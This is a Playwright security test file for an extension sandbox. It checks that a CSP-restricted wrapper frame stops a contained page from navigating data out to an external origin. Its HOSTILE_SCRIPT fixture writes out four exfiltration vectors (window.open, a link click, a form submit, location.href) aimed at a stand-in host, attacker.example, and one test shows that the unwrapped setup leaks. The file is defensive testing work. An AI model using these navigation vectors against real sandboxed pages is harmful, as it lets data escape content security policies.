/**
 * The extension navigation wall (M1-P3 fix round, blocker 1).
 *
 * `connect-src 'none'` is not an egress boundary on its own. It governs fetch,
 * WebSocket and EventSource; it does not govern `location.href`. A
 * `sandbox="allow-scripts"` frame cannot navigate its parent, but it *can*
 * navigate itself — and the request carrying the data leaves before the frame
 * does. Hermes proved that on WebKitGTK and in a browser harness against the
 * exact CSP this host served.
 *
 * The fix is a container: the frame host serves a trusted wrapper document
 * whose `frame-src` names only the loopback frame-host origin, and the
 * extension runs one level inside it. A nested context's navigation is checked
 * against its container's policy, so a departure is refused before a request.
 *
 * **Scope of this proof.** Chromium only — that is the runtime this harness
 * runs. Passing here is necessary, not sufficient: navigation-directive
 * behaviour is exactly the sort of thing that varies, and Hermes owns the
 * WebKitGTK/WebView2 confirmation. The first test below is the counterexample
 * that failed this round, kept permanently so a regression to the unwrapped
 * shape is caught rather than argued about.
 */
import { expect, test } from "@playwright/test";

import { installMockBridge } from "../helpers/bridge";

const HOST = "http://127.0.0.1:51234";
const SINK = "https://attacker.example";

/** The exact policy the frame host serves with an extension document. */
const EXTENSION_CSP = [
  "default-src 'none'",
  `script-src ${HOST} 'unsafe-inline'`,
  `style-src ${HOST} 'unsafe-inline'`,
  "connect-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join("; ");

/** The exact policy the frame host serves with the trusted wrapper. */
const WRAPPER_CSP = [
  "default-src 'none'",
  `frame-src ${HOST}`,
  "script-src 'unsafe-inline'",
  "connect-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join("; ");

/** Every way a contained page might try to reach an external origin. */
const HOSTILE_SCRIPT = `
  try { window.open("${SINK}/leak?v=open"); } catch (e) {}
  try {
    const a = document.createElement("a");
    a.href = "${SINK}/leak?v=link";
    document.body.append(a);
    a.click();
  } catch (e) {}
  try {
    const f = document.createElement("form");
    f.action = "${SINK}/leak?v=form";
    f.method = "GET";
    document.body.append(f);
    f.submit();
  } catch (e) {}
  try { location.href = "${SINK}/leak?v=nav"; } catch (e) {}
`;

async function watchSink(page: import("@playwright/test").Page) {
  const hits: string[] = [];
  await page.route(`${SINK}/**`, async (route) => {
    hits.push(route.request().url());
    await route.fulfill({ status: 200, body: "ok" });
  });
  return hits;
}

test("the unwrapped arrangement leaks — the counterexample this round failed on", async ({
  page,
}) => {
  const hits = await watchSink(page);
  await page.route(`${HOST}/**`, async (route) => {
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: { "Content-Security-Policy": EXTENSION_CSP },
      body: `<!doctype html><body><script>${HOSTILE_SCRIPT}</script>`,
    });
  });

  await installMockBridge(page);
  await page.goto("/#/extensions");
  await page.evaluate((host) => {
    const frame = document.createElement("iframe");
    frame.setAttribute("sandbox", "allow-scripts");
    frame.src = `${host}/ext/demo/index.html`;
    document.body.append(frame);
  }, HOST);
  await page.waitForTimeout(2000);

  // If this ever comes back empty the harness has stopped observing the leak,
  // and the wrapped result below would prove nothing.
  expect(hits.length).toBeGreaterThan(0);
});

test("the wrapper blocks every navigation vector to an external origin", async ({
  page,
}) => {
  const hits = await watchSink(page);
  await page.route(`${HOST}/**`, async (route) => {
    const url = new URL(route.request().url());
    if (url.pathname.startsWith("/frame/")) {
      await route.fulfill({
        status: 200,
        contentType: "text/html; charset=utf-8",
        headers: { "Content-Security-Policy": WRAPPER_CSP },
        body: `<!doctype html><iframe id="ext" sandbox="allow-scripts" src="${HOST}/ext/demo/index.html"></iframe>`,
      });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: { "Content-Security-Policy": EXTENSION_CSP },
      body: `<!doctype html><body><script>${HOSTILE_SCRIPT}</script>`,
    });
  });

  await installMockBridge(page);
  await page.goto("/#/extensions");
  await page.evaluate((host) => {
    const frame = document.createElement("iframe");
    frame.setAttribute("sandbox", "allow-scripts");
    frame.src = `${host}/frame/demo`;
    document.body.append(frame);
  }, HOST);
  await page.waitForTimeout(2000);

  expect(hits).toEqual([]);
});

test("the wrapper still lets the extension reach Buzz for the §2 handshake", async ({
  page,
}) => {
  // The wall must not close the door P4 needs. The wrapper adds a hop, so it
  // relays: the extension posts to its parent (the wrapper), which forwards to
  // Buzz. This asserts the message arrives *and* that a MessagePort survives
  // the trip back down, which is what §2's port transfer depends on.
  await page.route(`${HOST}/**`, async (route) => {
    const url = new URL(route.request().url());
    if (url.pathname.startsWith("/frame/")) {
      await route.fulfill({
        status: 200,
        contentType: "text/html; charset=utf-8",
        headers: { "Content-Security-Policy": WRAPPER_CSP },
        body: `<!doctype html><iframe id="ext" sandbox="allow-scripts" src="${HOST}/ext/demo/index.html"></iframe>
<script>
(function () {
  var frame = document.getElementById("ext");
  window.addEventListener("message", function (event) {
    if (event.source === frame.contentWindow) {
      parent.postMessage(event.data, "*", event.ports);
      return;
    }
    if (event.source === parent) {
      frame.contentWindow.postMessage(event.data, "*", event.ports);
    }
  });
})();
</script>`,
      });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: { "Content-Security-Policy": EXTENSION_CSP },
      body: `<!doctype html><script>
        parent.postMessage({ buzz: "ready" }, "*");
        window.addEventListener("message", function (event) {
          if (event.data && event.data.buzz === "port" && event.ports[0]) {
            event.ports[0].postMessage({ buzz: "port-works" });
          }
        });
      </script>`,
    });
  });

  await installMockBridge(page);
  await page.goto("/#/extensions");

  const outcome = await page.evaluate(async (host) => {
    return await new Promise<{ ready: boolean; viaPort: boolean }>(
      (resolve) => {
        const frame = document.createElement("iframe");
        frame.setAttribute("sandbox", "allow-scripts");
        frame.src = `${host}/frame/demo`;
        let ready = false;
        const timer = window.setTimeout(
          () => resolve({ ready, viaPort: false }),
          5000,
        );

        window.addEventListener("message", (event) => {
          if (event.source !== frame.contentWindow) return;
          if (event.data?.buzz !== "ready" || ready) return;
          ready = true;
          const channel = new MessageChannel();
          channel.port1.onmessage = (reply) => {
            if (reply.data?.buzz === "port-works") {
              window.clearTimeout(timer);
              resolve({ ready: true, viaPort: true });
            }
          };
          frame.contentWindow?.postMessage({ buzz: "port", v: 1 }, "*", [
            channel.port2,
          ]);
        });
        document.body.append(frame);
      },
    );
  }, HOST);

  expect(outcome.ready).toBe(true);
  expect(outcome.viaPort).toBe(true);
});
